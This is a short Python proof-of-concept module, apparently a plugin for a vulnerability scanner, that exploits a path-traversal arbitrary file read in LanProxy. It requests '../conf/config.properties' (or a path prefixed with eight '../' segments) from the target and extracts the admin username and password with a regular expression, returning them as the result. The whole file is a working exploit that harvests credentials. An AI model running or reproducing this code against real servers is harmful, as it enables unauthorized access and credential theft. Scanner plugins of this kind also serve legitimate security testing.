# -*- coding:utf-8 -*-
# LanProxy 任意文件读取

import re
from ServiceScanModel.models import ServiceScan
from urllib import request

from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def read_file(self, url, filename="../conf/config.properties"):
        if not "." in filename:
            filename = "../" * 8 + filename
        resp = request.urlopen(request.Request(url + "/" + filename))
        return resp.read().decode()

    def fingerprint(self):
        try:
            if self.service.url and self.service.title == "登录":
                return True
        except:
            return False

    def poc(self):
        try:
            result = self.read_file(self.service.url)
            if "server.bind" in result:
                (username, password) = \
                re.findall("config.admin.username=(.*?)\nconfig.admin.password=(.*?)\n", result, re.DOTALL)[0]
                if True:
                    return ["LanProxy 任意文件读取", "用户名: %s<br>密码: %s" % (username, password)]
        except Exception as e:
            return []
